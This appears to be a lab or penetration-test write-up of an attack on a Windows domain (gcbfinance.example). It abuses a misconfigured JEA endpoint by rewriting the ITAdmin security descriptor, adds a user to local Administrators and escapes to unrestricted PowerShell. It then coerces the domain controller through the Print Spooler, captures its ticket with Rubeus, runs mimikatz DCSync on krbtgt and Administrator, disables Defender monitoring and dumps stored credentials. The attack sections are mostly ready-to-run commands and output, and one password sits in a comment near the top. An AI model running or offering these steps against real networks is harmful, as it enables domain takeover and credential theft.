```powershell
# Option 1 — Connect via JEA endpoint ITAccess
$session=New-PSSession -ComputerName finance-vanessa.gcbfinance.example -Credential finance\vanessa -ConfigurationName ITAccess
# 300YearsAndStillG0ing$trong

# Option 2 — Connect via microsoft.powershell32 (elevated token)
Enter-PSSession -ComputerName finance-vanessa.gcbfinance.example -ConfigurationName microsoft.powershell32  -Credential it\itemployee15

# Option 3 — Connect via ITAdmin endpoint
Enter-PSSession -ComputerName finance-vanessa.gcbfinance.example -Credential finance\vanessa-admin -ConfigurationName microsoft.powershell32 | ITAdmin
# REDACTED_SECRET
```

## ENDPOINTS

Access through a JEA endpoint significantly restricts enumeration — available cmdlets are limited to those defined in the Role Capability associated with the endpoint configuration. Traditional OS/environment enumeration is largely ineffective in this context.

From an offensive perspective, the most productive approach is to identify JEA endpoint capabilities that enable escaping the restricted environment or abusing misconfigured delegation. Enumeration was therefore focused on discovering registered PowerShell endpoints and analyzing their execution configurations.

### 1. Enumerate All Registered PowerShell Endpoints

> From within the JEA `ITAccess` endpoint, enumerate registered PowerShell endpoints on the host to identify higher-privilege configurations.

```powershell
Invoke-Command -Session $session { Get-PSSessionConfiguration -Name '*' }
Name           : ITAccess
PSVersion      : 5.1
StartupScript  :
RunAsUser      :
Permission     : FINANCE\vanessa AccessAllowed
PSComputerName : finance-vanessa.gcbfinance.example

Name           : ITAdmin
PSVersion      : 5.1
StartupScript  :
RunAsUser      : finance\vanessa-admin
Permission     : BUILTIN\Administrators AccessAllowed
PSComputerName : finance-vanessa.gcbfinance.example

Name           : microsoft.powershell
PSVersion      : 5.1
StartupScript  :
RunAsUser      :
Permission     : NT AUTHORITY\INTERACTIVE AccessAllowed, BUILTIN\Administrators AccessAllowed, BUILTIN\Remote Management Users AccessAllowed
PSComputerName : finance-vanessa.gcbfinance.example

Name           : microsoft.powershell.workflow
PSVersion      : 5.1
StartupScript  :
RunAsUser      :
Permission     : BUILTIN\Administrators AccessAllowed, BUILTIN\Remote Management Users AccessAllowed
PSComputerName : finance-vanessa.gcbfinance.example

Name           : microsoft.powershell32
PSVersion      : 5.1
StartupScript  :
RunAsUser      :
Permission     : NT AUTHORITY\INTERACTIVE AccessAllowed, BUILTIN\Administrators AccessAllowed, BUILTIN\Remote Management Users AccessAllowed
PSComputerName : finance-vanessa.gcbfinance.example

Name           : microsoft.windows.servermanagerworkflows
PSVersion      : 3.0
StartupScript  :
RunAsUser      :
Permission     : NT AUTHORITY\INTERACTIVE AccessAllowed, BUILTIN\Administrators AccessAllowed
PSComputerName : finance-vanessa.gcbfinance.example
```

Two custom endpoints beyond the defaults: `ITAccess` and `ITAdmin`.

- **ITAccess** — Custom JEA endpoint accessible only to `FINANCE\vanessa`. Commands execute in the user's own context; exposes a limited set of cmdlets.
- **ITAdmin** — Privileged endpoint configured with `RunAsUser: finance\vanessa-admin`. Any commands executed through this endpoint run under that account — a high-value target offensively.

> Current identity: `finance\vanessa`

### 2. Enumerate ITAccess Capabilities

```powershell
Invoke-Command -Session $session { Get-PSSessionCapability  -UserName 'vanessa' -ConfigurationName 'ITAccess' }

CommandType     Name                             PSComputerName
-----------     ----                             --------------
Alias           clear -> Clear-Host              finance-vanessa.gcbfinance.example
Alias           cls -> Clear-Host                finance-vanessa.gcbfinance.example
Alias           exsn -> Exit-PSSession           finance-vanessa.gcbfinance.example
Alias           gcm -> Get-Command               finance-vanessa.gcbfinance.example
Alias           measure -> Measure-Object        finance-vanessa.gcbfinance.example
Alias           select -> Select-Object          finance-vanessa.gcbfinance.example
Function        Clear-Host                       finance-vanessa.gcbfinance.example
Function        Exit-PSSession                   finance-vanessa.gcbfinance.example
Function        Get-Command                      finance-vanessa.gcbfinance.example
Function        Get-FormatData                   finance-vanessa.gcbfinance.example
Function        Get-Help                         finance-vanessa.gcbfinance.example
Function        Get-PSSessionCapability          finance-vanessa.gcbfinance.example
Function        Get-PSSessionConfiguration       finance-vanessa.gcbfinance.example
Function        Measure-Object                   finance-vanessa.gcbfinance.example
Function        Out-Default                      finance-vanessa.gcbfinance.example
Function        Select-Object                    finance-vanessa.gcbfinance.example
Function        Set-PSSessionConfiguration       finance-vanessa.gcbfinance.example
Function        Start-Process                    finance-vanessa.gcbfinance.example
```

`vanessa` can execute `Set-PSSessionConfiguration`, `Get-PSSessionConfiguration`, and `Start-Process` — cmdlets that allow querying and modifying remote PowerShell endpoint configurations. Within a JEA context, this level of control represents a privilege escalation vector if the endpoint configuration can be altered to change its execution behavior.

### 3. Enumerate ITAdmin Capabilities

```powershell
Invoke-Command -Session $session { Get-PSSessionCapability  -UserName 'vanessa-admin' -ConfigurationName 'ITAdmin' }

CommandType     Name                              
-----------     ----                                
Alias           clear -> Clear-Host
Alias           cls -> Clear-Host
Alias           exsn -> Exit-PSSession
Alias           gcm -> Get-Command
Alias           measure -> Measure-Object
Alias           select -> Select-Object
Function        A:
Function        B:
Function        C:
Function        cd..
Function        cd\
Function        Clear-Host
Function        D:
Function        E:
Function        Exit-PSSession
Function        F:
Function        G:
Function        Get-Command
Function        Get-FormatData
Function        Get-Help
Function        Get-Verb
....
```

`ITAdmin` exposes a broad set of functions and cmdlets including standard system modules (`Microsoft.PowerShell.Management`, `Microsoft.PowerShell.Utility`, `Microsoft.PowerShell.Security`). The environment is not heavily restricted. Since the endpoint is configured with `RunAsUser: finance\vanessa-admin`, all commands executed through it run under that privileged account.

> The offensive objective: abuse available capabilities in `ITAccess` to modify the `ITAdmin` configuration so that a controlled user can connect to it and execute commands as `vanessa-admin`.

### 4. Enumerate ITAccess SDDL

```powershell
(Get-PSSessionConfiguration -Name ITAccess).SecurityDescriptorSDDL
# O:NSG:BAD:P(A;;GA;;;S-1-5-21-1708299476-1681750518-2103560891-1104)S:P(AU;FA;GA;;;WD)(AU;SA;GXGW;;;WD)
```

- `O:NSG:BAD`: object owner/group (not relevant for access)
- `P`: protected DACL — does not inherit permissions (Administrators have no implicit access)
- `(A;;GA;;;S-1-5-21-...-1104)`: Allow / GenericAll / `FINANCE\vanessa` — only identity with access
- `S:`: SACL (audit, not access control)
- `(AU;FA;GA;;;WD)`: failure audit for Everyone
- `(AU;SA;GXGW;;;WD)`: success audit for Everyone

> `vanessa only`: full control | `admins`: ❌ blocked | `inheritance`: ❌ disabled | `auditing`: ✅ fully logged

## ATTACK CHAIN

`10.200.10.14 ~ FINANCE-VANESSA` via JEA `ITAccess` → abuse `Set-PSSessionConfiguration` to modify the SDDL of `ITAdmin` → access the privileged endpoint as `vanessa-admin` (RunAsUser) → local Administrator escalation → JEA escape via `microsoft.powershell32` → unrestricted command execution → Unconstrained Delegation abuse → coerce the Domain Controller → capture TGT in memory → Pass-the-Ticket as DC → DCSync → full domain compromise

## EXPLOITATION

### JEA Pivot: ITAccess → ITAdmin → microsoft.powershell32

#### 1. Security Descriptor Modification

From `ITAccess`, `Set-PSSessionConfiguration` is abused to modify the SDDL of `ITAdmin` and grant access to the controlled user.

```powershell
# Obtain SID of the controlled user
(Get-DomainUser -Identity itemployee15).objectsid
# S-1-5-21-1708299476-1681750518-2103560891-1104

# Modify the SDDL of ITAdmin to grant access
Invoke-Command -Session $session {Set-PSSessionConfiguration -Name ITAdmin -SecurityDescriptorSddl 'O:NSG:BAD:P(A;;GA;;;BA)(A;;GA;;;S-1-5-21-948911695-1962824894-4291460450-29606)S:P(AU;FA;GA;;;WD)(AU;SA;GXGW;;;WD)'}
```

The `Set-PSSessionConfiguration` cmdlet modifies the security descriptor of `ITAdmin`, appending the SID of `it\itemployee15` to grant it access to the privileged endpoint.

> Modifying the endpoint configuration triggers a WinRM restart, which terminates all active remote sessions.

#### 2. Access the Privileged Endpoint

```powershell
# Establish session in ITAdmin, which runs as vanessa-admin
$session2=New-PSSession -ComputerName finance-vanessa.gcbfinance.example -ConfigurationName ITAdmin -Credential it\itemployee15

# Interactive access to the privileged endpoint
Enter-PSSession -Session $session2
```

#### 3. Local Administrator Escalation

Commands execute as `vanessa-admin`. Add `it\itemployee15` to the local Administrators group.

```powershell
# Option 1
Start-Process cmd.exe -ArgumentList "/c net localgroup Administrators it\itemployee15 /add"

# Option 2
Invoke-Expression "cmd.exe /c net localgroup Administrators it\itemployee15 /add"

# Option 3
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c net localgroup Administrators it\itemployee15 /add"
```

#### 4. JEA Escape

```powershell
# Access unrestricted PowerShell using the newly elevated context
Enter-PSSession -ComputerName finance-vanessa.gcbfinance.example -ConfigurationName microsoft.powershell32  -Credential it\itemployee15
```

> Provides full PowerShell access without JEA restrictions.

### Unconstrained Delegation — TGT Capture from the Domain Controller

When a service is configured with Unconstrained Delegation, the KDC forwards the authenticating user's TGT to the delegated host. The ticket is stored in LSASS memory. If a privileged account — such as a Domain Controller — authenticates against the compromised host, its TGT is captured and can be reused to impersonate that identity within the domain.

#### Requirements

> An elevated token is required — achieved via the RCE obtained above.

```powershell
where powershell
# C:\Windows\System32\powershell.exe
# C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

C:\Windows\system32>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

hostname;whoami
# finance-vanessa
# nt authority\system
```

#### 1. Monitor for Incoming TGTs

```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
```

> Real-time monitoring of TGTs arriving in memory as entities authenticate against the system.

#### 2. Coerce DC Authentication (SpoolService Trigger)

`SharpSpoolTrigger` exploits the Print Spooler service to force the Domain Controller to authenticate against the compromised host. Due to Unconstrained Delegation, the DC's TGT is forwarded and stored in LSASS.

```powershell
.\SharpSpoolTrigger.exe finance-dc01 finance-vanessa
```

#### 3. Inject the Captured Ticket (Pass-the-Ticket)

```powershell
.\Rubeus.exe ptt /ticket:
```

Authenticates in the domain as the Domain Controller.

#### 4. DCSync

```powershell
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt" "exit"
# USER   : KRBTGT
# NTLM   : REDACTED_HASH
# AES256 : REDACTED_HASH

.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:administrator" "exit"
# USER   : Administrator
# NTLM   : REDACTED_HASH
# AES256 : REDACTED_HASH
```

> Obtaining the KRBTGT keys enables Golden Ticket creation and persistent full control over `gcbfinance.example`

## POST-EXPLOITATION

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa:REDACTED_SECRET" "vault:REDACTED_SECRET" "vault::cred /patch" "lsadump::secrets" "exit"

# Username : vanessa-admin
# NTLM     : REDACTED_HASH
# Username : FINANCE-VANESSA$
# NTLM     : REDACTED_HASH
# Username : Administrator
# NTLM     : REDACTED_HASH

# URL: MICROSOFT_WINRM_RUNAS_ITAdmin
# Login: MICROSOFT_WINRM_RUNAS_ITAdmin
# Password: REDACTED_SECRET
# Name: MICROSOFT_WINRM_RUNAS_ITAdmin
```

The cleartext password for the `ITAdmin` RunAsUser (`vanessa-admin`) was recovered from the Windows Credential Manager — allowing direct access as the privileged account without needing to abuse the JEA mechanism.

```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
```

### JEA Endpoint Configuration Review (from microsoft.powershell32)

```powershell
# Read ITAccess session configuration file
cat "C:\Windows\System32\WindowsPowerShell\v1.0\SessionConfig\ITAccess_54906d16-7873-47d3-81f1-fc8d29748ecf.pssc"
```

```powershell
@{
SchemaVersion = '10.200.13.0'
GUID = '54906d16-7873-47d3-81f1-fc8d29748ecf'
Author = 'vanessa-admin'
SessionType = 'RestrictedRemoteServer'
TranscriptDirectory = 'C:\ProgramData\JEAConfiguration\Transcripts'
RunAsVirtualAccount = $true
RoleDefinitions = @{
    'finance\vanessa' = @{
        'RoleCapabilities' = 'ITAccess' } }
}
```

- `SessionType = RestrictedRemoteServer` — restricted JEA session, not full PowerShell
- `RunAsVirtualAccount = $true` — runs as a virtual admin account; elevated privileges without exposing real credentials
- `TranscriptDirectory` — all commands are logged to disk (full audit trail)
- `RoleDefinitions` — only `finance\vanessa` enters and receives the `ITAccess` role

```powershell
# Read ITAdmin session configuration file
cat "C:\Windows\System32\WindowsPowerShell\v1.0\SessionConfig\ITAdmin_d768869e-8737-43f0-9375-62f60e31afc4.pssc"
```

```powershell
@{
SchemaVersion = '10.200.13.0'
GUID = 'd768869e-8737-43f0-9375-62f60e31afc4'
Author = 'vanessa-admin'
SessionType = 'RestrictedRemoteServer'
TranscriptDirectory = 'C:\ProgramData\JEAConfiguration\Transcripts'
RunAsVirtualAccount = $true
RoleDefinitions = @{
    'administrators' = @{
        'RoleCapabilities' = 'ITAdmin' }
    'IT\ITEmployeesUsers' = @{
        'RoleCapabilities' = 'ITAdmin' } }
LanguageMode = 'ConstrainedLanguage'
}
```

- `RunAsVirtualAccount = $true` — elevated execution without exposing credentials
- `RoleDefinitions` — both `Administrators` and `IT\ITEmployeesUsers` receive the `ITAdmin` role (broader attack surface)
- `LanguageMode = ConstrainedLanguage` — restricts direct .NET access, reduces but does not eliminate abuse potential

```powershell
(Get-PSSessionConfiguration -Name itadmin).ConfigFilePath

# Read ITAccess role capability file
cat "C:\Program Files\WindowsPowerShell\Modules\JEARoles\RoleCapabilities\ITAccess.psrc"
```

```powershell
@{
GUID = '07a1ed91-facb-4b17-8bbf-601c56bbabc6'
Author = 'IT'
Description = 'Allow access for IT mainetanance'
CompanyName = 'Global Central Bank'
Copyright = '(c) 2019 IT. All rights reserved.'
ModulesToImport = 'Microsoft.PowerShell.Core'
VisibleCmdlets = @{
    'Name' = 'Get-PSSessionConfiguration'
    'Parameters' = @{
        'Name' = 'Name' }, @{
        'Name' = 'Force' } }, @{
    'Name' = 'Get-PSSessionCapability'
    'Parameters' = @{
        'Name' = 'ConfigurationName' }, @{
        'Name' = 'Username' }, @{
        'Name' = 'Full' } }, @{
    'Name' = 'Start-Process'
    'Parameters' = @{
        'Name' = 'NoNewWindow' } }, @{
    'Name' = 'Set-PSSessionConfiguration'
    'Parameters' = @{
        'Name' = 'SecurityDescriptorSddl' }, @{
        'Name' = 'Name' }, @{
        'Name' = 'Force' } }
}
```

- `ModulesToImport = Microsoft.PowerShell.Core` — minimal PowerShell environment
- `VisibleCmdlets` — only these cmdlets are accessible; everything else is blocked
- `Get-PSSessionConfiguration` — endpoint enumeration
- `Get-PSSessionCapability` — capability recon across JEA configurations
- `Start-Process` — potential binary execution (context-dependent)
- `Set-PSSessionConfiguration` — SDDL modification, access grant, isolation bypass
